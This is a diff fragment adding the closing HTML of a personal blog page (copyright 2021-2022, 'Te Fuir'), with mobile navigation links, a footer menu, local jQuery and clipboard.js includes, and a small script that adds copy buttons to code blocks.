+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    Te Fuir
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/links/">links</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+ 
+  <link
+    rel="preload"
+    href="/lib/font-awesome/css/all.min.css"
+    as="style"
+    onload="this.onload=null;this.rel='stylesheet'"
+  />
+  <noscript
+    ><link
+      rel="stylesheet"
+      href="/lib/font-awesome/css/all.min.css"
+  /></noscript>
+
+
+    <!-- jquery -->
+ 
+  
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+
+
+
+<!-- clipboard -->
+
+   
+    
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
